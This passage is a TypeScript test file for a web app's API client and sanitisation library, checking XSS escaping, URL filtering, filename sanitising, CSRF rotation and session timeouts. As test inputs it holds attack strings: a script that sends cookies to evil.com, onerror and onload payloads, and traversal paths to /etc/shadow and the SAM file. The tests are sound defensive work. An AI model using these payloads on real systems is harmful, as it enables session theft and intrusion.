            const client = new ApiClient('http://localhost:5000', 30000, 0);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            expect(result.error).toBe('Session expired');
        });

        it('returns error for 500 after retries exhausted', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ error: 'Database connection lost' }, 500));

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            expect(result.error).toContain('Database connection lost');
        });

        it('extracts CSRF token from response header and stores it', async () => {
            const authModule = await import('@/lib/auth');

            fetchMock.mockResolvedValue(
                makeJsonResponse({ success: true }, 200, { 'X-CSRF-Token': 'new-rotated-csrf' })
            );

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            await client.getHealth();

            expect(authModule.getCsrfToken()).toBe('new-rotated-csrf');
        });
    });
});

// ============================================================================
// Security Tests
// ============================================================================

describe('Security Tests', () => {
    let sanitizeModule: typeof import('@/lib/sanitize');

    beforeEach(async () => {
        vi.resetModules();
        sanitizeModule = await import('@/lib/sanitize');
    });

    describe('XSS Attack Payload Sanitization', () => {
        it('sanitize.text escapes script tags making them non-executable', () => {
            const payload = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
            const result = sanitizeModule.sanitize.text(payload);
            // HTML tags are escaped so browser will not interpret them
            expect(result).not.toContain('<script>');
            expect(result).not.toContain('</script>');
            expect(result).toContain('&lt;script&gt;');
        });

        it('sanitize.text escapes img tags preventing onerror execution', () => {
            const payload = '<img src=x onerror="alert(1)">';
            const result = sanitizeModule.sanitize.text(payload);
            // Angle brackets are escaped so the tag is not rendered as HTML
            expect(result).not.toContain('<img');
            expect(result).not.toContain('>');
            expect(result).toContain('&lt;img');
        });

        it('sanitize.text escapes SVG tags preventing onload execution', () => {
            const payload = '<svg onload="alert(1)"></svg>';
            const result = sanitizeModule.sanitize.text(payload);
            expect(result).not.toContain('<svg');
            expect(result).toContain('&lt;svg');
        });

        it('sanitize.html strips script tags entirely', () => {
            const payload = '<script>alert("xss")</script>';
            const result = sanitizeModule.sanitize.html(payload);
            expect(result).not.toContain('<script');
            expect(result).not.toContain('alert');
        });

        it('sanitize.html strips event handlers from remaining tags', () => {
            const payload = '<div onmouseover="steal()"><p onclick="evil()">text</p></div>';
            const result = sanitizeModule.sanitize.html(payload);
            expect(result).not.toContain('onmouseover');
            expect(result).not.toContain('onclick');
            expect(result).not.toContain('steal()');
            expect(result).not.toContain('evil()');
        });
    });

    describe('URL Injection Prevention', () => {
        it('blocks javascript: protocol with mixed case', () => {
            expect(sanitizeModule.sanitize.url('JavaScript:alert(1)')).toBe('');
        });

        it('blocks javascript: with leading whitespace', () => {
            expect(sanitizeModule.sanitize.url('  javascript:alert(1)')).toBe('');
        });

        it('blocks data: URI with base64 payload', () => {
            const payload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
            expect(sanitizeModule.sanitize.url(payload)).toBe('');
        });
    });

    describe('File Upload Path Traversal Prevention', () => {
        it('prevents escaping upload directory with ../', () => {
            const malicious = '../../../etc/shadow';
            const result = sanitizeModule.sanitize.filename(malicious);
            expect(result).not.toContain('..');
            expect(result).not.toContain('/');
        });

        it('prevents Windows-style path traversal', () => {
            const malicious = '..\\..\\windows\\system32\\config\\SAM';
            const result = sanitizeModule.sanitize.filename(malicious);
            expect(result).not.toContain('..');
            expect(result).not.toContain('\\');
        });

        it('prevents null byte injection to bypass extension check', () => {
            const malicious = 'evil.php\x00.jpg';
            const result = sanitizeModule.sanitize.filename(malicious);
            expect(result).not.toContain('\x00');
        });
    });

    describe('JSON Injection via API Responses', () => {
        it('sanitize.object neutralizes script tags in API response strings', () => {
            const apiResponse = {
                company_name: '<script>steal()</script>Acme Corp',
                migration_id: 'mig_001',
                status: 'completed',
            };
            const sanitized = sanitizeModule.sanitize.object(apiResponse);
            expect(sanitized.company_name).not.toContain('<script>');
            expect(sanitized.company_name).toContain('Acme Corp');
        });

        it('sanitize.object handles nested malicious data', () => {
            const apiResponse = {
                user: {
                    name: '"><img src=x onerror=alert(1)>',
                    email: 'test@safe.com',
                },
                activities: [
                    '<svg onload=evil()>',
                    'Normal activity',
                ],
            };
            const sanitized = sanitizeModule.sanitize.object(apiResponse);
            expect((sanitized.user as { name: string }).name).not.toContain('<img');
            expect((sanitized.activities as string[])[0]).not.toContain('<svg');
            expect((sanitized.activities as string[])[1]).toBe('Normal activity');
        });
    });

    describe('CSRF Token Rotation', () => {
        it('updates stored CSRF token when response header contains new token', async () => {
            vi.resetModules();
            const authModule = await import('@/lib/auth');

            authModule.setCsrfToken('old-csrf-token');
            expect(authModule.getCsrfToken()).toBe('old-csrf-token');

            // Simulate receiving a new token from server response
            authModule.setCsrfToken('rotated-csrf-token');
            expect(authModule.getCsrfToken()).toBe('rotated-csrf-token');
        });

        it('clearAuth removes CSRF token preventing reuse after logout', async () => {
            vi.resetModules();
            const authModule = await import('@/lib/auth');

            authModule.setCsrfToken('session-csrf');
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            authModule.clearAuth();

            expect(authModule.getCsrfToken()).toBeNull();
            const headers = authModule.getAuthHeader(true);
            expect(headers['X-CSRF-Token']).toBeUndefined();
        });
    });

    describe('Session Security Enforcement', () => {
        it('absolute session limit of 8 hours cannot be bypassed by activity', async () => {
            vi.resetModules();
            const authModule = await import('@/lib/auth');

            // Session started 8.5 hours ago, but "active" just now
            const eightAndHalfHoursAgo = Date.now() - (8.5 * 60 * 60 * 1000);
            sessionStorage.setItem('fb_session_start', String(eightAndHalfHoursAgo));
            sessionStorage.setItem('fb_last_activity', String(Date.now()));

            expect(authModule.isSessionExpired()).toBe(true);
        });

        it('inactivity timeout triggers even within absolute session window', async () => {
            vi.resetModules();
            const authModule = await import('@/lib/auth');

            // Session started 1 hour ago, but inactive for 35 minutes
            const oneHourAgo = Date.now() - (1 * 60 * 60 * 1000);
            const thirtyFiveMinAgo = Date.now() - (35 * 60 * 1000);
            sessionStorage.setItem('fb_session_start', String(oneHourAgo));
            sessionStorage.setItem('fb_last_activity', String(thirtyFiveMinAgo));

            expect(authModule.isSessionExpired()).toBe(true);
        });
    });
});
